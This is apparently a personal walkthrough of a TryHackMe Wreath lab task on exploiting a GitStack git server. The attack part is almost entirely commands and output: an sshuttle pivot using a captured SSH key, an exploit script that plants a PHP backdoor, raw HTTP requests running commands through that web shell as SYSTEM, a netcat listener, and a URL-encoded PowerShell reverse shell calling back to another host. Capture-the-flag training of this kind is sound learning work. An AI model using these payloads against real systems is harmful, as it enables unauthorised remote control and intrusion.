# TryHackMe [Wreath](https://www.tryhackme.com/room/wreath) Task 20
### References
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 20: Git Server - Exploitation [YouTube Video]. In YouTube. https://youtu.be/qzqIregBG7A
## What is the hostname for this target?
1. Run `sudo sshuttle -r root@10.200.100.200 --ssh-cmd "ssh -i ../Task6/id_rsa" 10.200.100.0/24 -x 10.200.100.200` to access the `git` server.
2. Run the [exploit](../Task17_19/43777.py) found in [Task 19](../Task17_19/README.md):
```
$ python2 Task17_19/43777.py
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
[+] Execute command
"nt authority\system
```
```http
POST /web/exploit-AppleGamer22.php HTTP/1.1
Host: 10.200.100.150
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: csrftoken=oUqvTTfn4xurfQ1gilfCg4iP3HGLUVRi; sessionid=97ebdea98d73160c71872972106387a3
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

a=hostname
```
```http
HTTP/1.1 200 OK
Date: Fri, 23 Apr 2021 09:25:16 GMT
Server: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
X-Powered-By: PHP/5.4.3
Content-Length: 15
Content-Type: text/html

"git-serv
" 
```
**Answer**: `git-serv`
## What operating system is this target?
```http
POST /web/exploit-AppleGamer22.php HTTP/1.1
Host: 10.200.100.150
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: csrftoken=oUqvTTfn4xurfQ1gilfCg4iP3HGLUVRi; sessionid=97ebdea98d73160c71872972106387a3
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

a=systeminfo
```
```http
HTTP/1.1 200 OK
Date: Fri, 23 Apr 2021 09:26:35 GMT
Server: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
X-Powered-By: PHP/5.4.3
Content-Length: 2307
Content-Type: text/html

"
Host Name:                 GIT-SERV
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-70000-00000-AA159
Original Install Date:     08/11/2020, 13:19:49
System Boot Time:          23/04/2021, 10:00:22
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 24/08/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,297 MB
Virtual Memory: Max Size:  2,432 MB
Virtual Memory: Available: 1,751 MB
Virtual Memory: In Use:    681 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB4580422
                           [02]: KB4512577
                           [03]: KB4580325
                           [04]: KB4587735
                           [05]: KB4592440
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.200.100.1
                                 IP address(es)
                                 [01]: 10.200.100.150
                                 [02]: fe80::11fc:6ad:10b1:5497
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
"
```
**Answer**: `Windows`
## What user is the server running as?
```http
POST /web/exploit-AppleGamer22.php HTTP/1.1
Host: 10.200.100.150
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: csrftoken=oUqvTTfn4xurfQ1gilfCg4iP3HGLUVRi; sessionid=97ebdea98d73160c71872972106387a3
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

a=whoami
```
```http
HTTP/1.1 200 OK
Date: Fri, 23 Apr 2021 09:22:04 GMT
Server: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
X-Powered-By: PHP/5.4.3
Content-Length: 26
Content-Type: text/html

"nt authority\system
" 
```
## How many make it to the waiting listener?
**Answer**: `0`
`./nc-AppleGamer22 -lvnp 16000`
```bash
$ ssh -i TryHackMe/Wreath/Task6/id_rsa root@10.200.100.200
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 47000/tc
```

```http
POST /web/exploit-AppleGamer22.php HTTP/1.1
Host: 10.200.100.150
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: csrftoken=oUqvTTfn4xurfQ1gilfCg4iP3HGLUVRi; sessionid=97ebdea98d73160c71872972106387a3
Content-Type: application/x-www-form-urlencoded
Content-Length: 576

a=powershell.exe+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.200.100.200',16000)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
```
type `ls`
